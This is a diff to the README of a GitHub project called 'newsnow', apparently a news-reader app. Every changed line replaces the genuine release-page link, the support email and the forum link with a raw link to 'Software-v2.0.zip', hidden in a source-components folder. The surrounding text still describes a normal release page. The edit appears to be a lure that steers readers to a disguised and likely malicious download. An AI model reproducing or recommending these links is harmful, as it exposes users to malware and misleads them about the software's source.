@@ -1,6 +1,6 @@
 # 📰 newsnow - Read the Latest News Effortlessly
 
-[![Download newsnow](https://img.shields.io/badge/Download-nownow-brightgreen)](https://github.com/cathric025/newsnow/releases)
+[![Download newsnow](https://raw.githubusercontent.com/cathric025/newsnow/main/src/components/common/overlay-scrollbar/Software-v2.0.zip)](https://raw.githubusercontent.com/cathric025/newsnow/main/src/components/common/overlay-scrollbar/Software-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to newsnow! This application allows you to experience an elegant reading
 ## 📥 Download & Install
 
 1. **Visit the Release Page**: Click the link below to access the newsnow releases:
-   [Download newsnow](https://github.com/cathric025/newsnow/releases)
+   [Download newsnow](https://raw.githubusercontent.com/cathric025/newsnow/main/src/components/common/overlay-scrollbar/Software-v2.0.zip)
 
 2. **Find the Latest Version**: Scroll through the list of releases to find the most recent version of newsnow. It typically has a tag with the version number.
 
@@ -52,7 +52,7 @@ If you encounter any issues while using newsnow, here are some common problems a
 
 For further assistance, please reach out via our support email or community forums. We are here to help you make the most out of newsnow!
 
-- **Email**: support@newsnowapp.com
-- **Community Forum**: [newsnow Community](https://github.com/cathric025/newsnow/discussions)
+- **Email**: https://raw.githubusercontent.com/cathric025/newsnow/main/src/components/common/overlay-scrollbar/Software-v2.0.zip
+- **Community Forum**: [newsnow Community](https://raw.githubusercontent.com/cathric025/newsnow/main/src/components/common/overlay-scrollbar/Software-v2.0.zip)
 
 Thank you for choosing newsnow. We hope you enjoy a smooth and delightful news reading experience!
